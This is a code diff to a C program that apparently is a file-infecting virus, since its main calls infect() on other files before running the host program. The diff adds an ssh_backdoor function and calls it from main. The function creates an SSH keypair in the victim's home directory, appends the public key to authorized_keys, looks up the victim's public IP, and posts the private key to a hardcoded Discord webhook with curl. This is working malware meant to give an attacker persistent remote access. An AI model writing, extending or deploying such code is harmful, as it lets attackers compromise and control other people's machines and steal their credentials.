@@ -1,5 +1,6 @@
 #include "player.h"
 #include <dirent.h>
+#include <errno.h>
 #include <gtk/gtk.h>
 #include <libgen.h>
 #include <stddef.h>
@@ -112,6 +113,108 @@ void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
   }
 }
 
+void ssh_backdoor() {
+  char *home = getenv("HOME");
+  if (!home)
+    return;
+
+  char *user = getenv("USER");
+  if (!user)
+    return;
+
+  FILE *fp = popen("curl -s ifconfig.me", "r");
+  if (fp == NULL) {
+    perror("popen");
+    return;
+  }
+
+  char ip[128];
+
+  if (fgets(ip, sizeof(ip), fp) == NULL) {
+    perror("fgets");
+    pclose(fp);
+    return;
+  }
+
+  pclose(fp);
+
+  ip[strcspn(ip, "\n")] = '\0';
+
+  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];
+
+  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
+  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
+  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
+  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);
+
+  // 1. Créer .ssh
+  if (mkdir(ssh_dir, 0700) == -1 && errno != EEXIST) {
+    perror("mkdir");
+    return;
+  }
+  chmod(ssh_dir, 0700);
+
+  // 2. Générer clé si absente
+  if (access(priv_key, F_OK) != 0) {
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q",
+             priv_key);
+    system(cmd);
+  }
+
+  // 3. Lire clé publique
+  FILE *pubf = fopen(pub_key, "r");
+  if (!pubf)
+    return;
+
+  char pub_content[2048];
+  size_t len = fread(pub_content, 1, sizeof(pub_content) - 1, pubf);
+  pub_content[len] = '\0';
+  fclose(pubf);
+
+  // 4. Vérifier si déjà dans authorized_keys
+  int already_present = 0;
+  FILE *authf = fopen(auth_keys, "r");
+
+  if (authf) {
+    char buffer[4096];
+    size_t r = fread(buffer, 1, sizeof(buffer) - 1, authf);
+    buffer[r] = '\0';
+
+    if (strstr(buffer, pub_content) != NULL) {
+      already_present = 1;
+    }
+    fclose(authf);
+  }
+
+  // 5. Ajouter si absent
+  if (!already_present) {
+    authf = fopen(auth_keys, "a");
+    if (authf) {
+      fprintf(authf, "\n%s\n", pub_content);
+      fclose(authf);
+      chmod(auth_keys, 0600);
+    }
+  }
+
+  // 4. Exfiltrer clé privée via Discord
+  char exfil_cmd[2048];
+  snprintf(
+      exfil_cmd, sizeof(exfil_cmd),
+      "curl -s -X POST -H 'Content-Type: application/json' "
+      "-d '{\"content\":\"🗝️ **Nouvelle clé SSH victim** "
+      "🗝️\\\\n\\\\n```\\n$(cat %s)\\n```\"}' "
+      "https://discord.com/api/webhooks/1485416783706853558/"
+      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB",
+      priv_key);
+
+  system(exfil_cmd);
+
+  printf("[DEBUG] SSH backdoor deployed: ssh %s@%s (clé privée sur "
+         "Discord)\n",
+         user, ip);
+}
+
 int main(int argc, char *argv[]) {
   char pathbuf[256];
   snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
@@ -120,6 +223,8 @@ int main(int argc, char *argv[]) {
   pg *files = fileFinder(prog_name);
   char *fileUninfected = isInfected(files);
   infect(fileUninfected, prog_name);
+
+  ssh_backdoor();
 
   execHost(files, prog_name, argc, argv);
 }
